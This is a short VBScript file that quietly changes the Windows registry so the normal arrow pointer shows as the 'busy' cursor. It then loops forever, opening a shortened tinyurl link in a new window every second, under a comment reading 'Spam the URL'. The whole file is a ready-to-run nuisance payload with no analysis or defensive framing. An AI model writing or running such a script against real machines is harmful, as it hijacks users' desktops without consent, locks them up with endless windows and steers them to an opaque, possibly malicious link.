Set WshShell = CreateObject("WScript.Shell")

On Error Resume Next
WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Cursors\Arrow", "C:\\Windows\\cursors\\aero_busy.cur", "REG_STRING"
On Error GoTo 0

' Spam the URL
Do While True
    WshShell.Run "cmd /c start " & "https://tinyurl.com/ggtfiles"
    WScript.Sleep 1000 ' Wait for 1 second before opening the next link
Loop
